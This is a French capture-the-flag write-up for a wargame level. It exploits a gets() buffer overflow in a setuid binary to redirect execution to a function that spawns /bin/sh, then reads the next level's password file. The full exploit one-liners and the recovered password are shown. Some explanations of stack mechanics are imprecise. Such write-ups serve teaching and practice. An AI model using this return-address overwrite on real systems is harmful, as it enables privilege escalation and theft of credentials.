## Comportement
- J'ai des droits `level1` que je peux verifier en tapant `whoami`
- Un binaire est present avec des droits differents : `-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*`
En exécutant le binaire (`./level1`), on observe:
- qu'il attend un input de notre part.
- qu'il exit juste apres notre input.
- qu'il segfault `Segmentation fault (core dumped)` si l'input est trop long.

→ Peut-être un segfault à exploiter ?


## Analyse
En analysant le binaire (`gdb ./level1`) on observe:
- La fonction appelle "gets" qui n'est pas securisé en cas de buffer overrun (voir `man gets`).
  ```shell
  (gdb) disas main
  ...
  0x08048490 <+16>:	call   0x8048340 <gets@plt>
  ...
  ```
- Il existe une fonction `run()` qui n'est pas appelé dans `main()` : 
  ```shell
  (gdb) i functions
  ...
  0x08048444  run
  0x08048480  main
  ...
  ```
- Dans la fonction `run()` il y a un appel systeme : 
  ```shell
  (gdb) disas main
  ...
  0x08048472 <+46>:	movl   $0x8048584,(%esp) # argument envoye a la fonction system() en dessous
  0x08048479 <+53>:	call   0x8048360 <system@plt>
  ...
  ```
- Il suffit d'examiner l'adresse du parametre envoye a la fonction `system()` 
(situe une ligne au dessus) pour constater qu'on execute `/bin/sh`. 
Ce qui est une technique courante pour lancer un shell interactif. 
  ```shell
  (gdb) x/s 0x8048584
  0x8048584:	 "/bin/sh"
  ```
- Il faudrait une commande `call` dans la fonction `main()` pour que l'on puisse facilement l'overflow avec 
l'adresse de `run()` mais il n'y en a pas. Par contre en fin de fonction il y a toujours la commande `ret` : 
elle retourne a l'adresse precise ou le programme se trouvait avant d'executer la fonction en question 
(c'est l'`ebp` precedent ("old ebp") qui est push sur la stack a la toute premiere instruction de chaque fonction) : 
  ```shell
  (gdb) disas main
  ...
  0x08048480 <+0>:	push   %ebp # ebp push sur la stack
  0x08048481 <+1>:	mov    %esp,%ebp # ebp remplace par esp
  ...
  0x08048495 <+21>:	leave  # esp remplace par ebp + pop ebp hors de la stack
  0x08048496 <+22>:	ret # renvoi vers ebp
  ...
  ```

## Résolution
- Il faut donc overflow la valeur de l'`ebp` avec l'adresse de la fonction `run()` pour que quand la 
commande `ret()` sera execute, c'est `run()` qui sera appelee et donc notre appel systeme sera execute
ouvrant ainsi un shell interactif.
- Il faut trouver l'offset de l'`eip` (le pointeur deu jeu d'instruction en cours) pour savoir de 
combien il faut overflow le buffer. Dans `main()` on a vu que le buffer est de 80 bytes. 
(`0x08048486 <+6>:		sub    esp,0x50`). On obtient bien un segfault : 
```shell
$ python -c 'print "A" * 80' | ./level1
Segmentation fault (core dumped)
```
- Maintenant il faut gerer le padding, c'est a dire soustraire suffisament de bytes pour placer l'adresse 
de la fonction `run()` (`0x08048444`) que l'on veut inserer. Elle prend 4 bytes. On obtient encore un 
segfault, cette fois ce n'est pas normal car `run()` aurait du etre appele. 
```shell
$ python -c 'print "A" * 76 + "\x08\x04\x84\x44"' | ./level1
Segmentation fault (core dumped)
```
- En regardant bien la stack, on voit que l'adresse est inscrite en little endian, il faut donc l'inverser.
La fonction `run()` ets bien appele ! On le voit grace au print "Good... Wait what?" mais ou est le shell ? 
```shell
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
- Le shell exit car son process parent exit. Du coup il faut modifier le code pour fait un cat du mot
de passe avant que le shell ne se ferme. Cela donne : 
```shell
$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; echo "cat /home/user/level2/.pass") | ./level1
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```

Il ne reste plus qu'à :
- et passer au level1 (`su level1`) en renseignant le password obtenu plus haut.


